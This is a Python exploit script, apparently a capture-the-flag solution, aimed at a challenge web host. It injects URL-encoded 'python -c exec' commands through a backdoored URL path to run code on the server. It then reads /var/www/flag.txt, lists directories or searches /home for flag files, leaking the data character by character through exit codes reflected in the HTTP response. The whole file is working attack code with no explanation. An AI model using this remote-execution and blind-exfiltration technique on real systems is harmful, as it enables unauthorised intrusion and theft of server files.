import requests


counter = 0
while True:
    init = "import os\\nimport sys\\ncounter = "
    flag_search = "\\nfor (dirpath, dirnames, filenames) in os.walk(\\'/home\\'):\\n\\tfor fname in filenames:\\n\\t\\tif fname == \\'backdoor.c\\':\\n\\t\\t\\texit(6)\\n\\t\\ttry:\\n\\t\\t\\twith open(os.path.join(dirpath, fname), \\'r\\') as f:\\n\\t\\t\\t\\tfbody = f.read()\\n\\t\\t\\t\\tif \\'flag{\\' in fbody:\\n\\t\\t\\t\\t\\texit(ord(fbody[fbody.index(\\'flag{\\') + 5:][counter]))\\n\\t\\texcept IOError:\\n\\t\\t\\tpass\\nexit(5)"
    list_dir = "\\nexit(ord(\\' \\'.join(os.listdir(\\'/var/www\\'))[counter]))"
    flag_read = "\\nwith open(\\'/var/www/flag.txt\\', \\'r\\') as f:\\n\\t exit(ord(f.read()[counter]))"
    request = init + str(counter) + flag_read
    request = 'python -c \"exec(\'{}\')\"'.format(request)
    request = request.replace('\\', '%5C')
    request = request.replace(' ', '_')
    request = request.replace('+', '%2B')
    url = 'https://indianer.flatearth.fluxfingers.net/index.html/dpdpdpamamamamajvjvjvjvgsgsgsgsgpdp=' + request + '_%23'
    reset = 'https://indianer.flatearth.fluxfingers.net/index.html'

    chr_resp = 0
    while chr_resp == 0 or chr_resp == 2:
        r = requests.get(url)
        while 'Not Found' not in r.text or 'dpdpdpamamamam' in r.text:
            r = requests.get(url)

        res = r.text
        chr_resp = ord(res[res.index('ndex') - 1]) - ord('i')
    print('exit_code', chr_resp)
    try:
        print('chr_rep', chr(chr_resp))
    except:
        print('chr_rep', 'unprintable')

    requests.get(reset)
    counter += 1
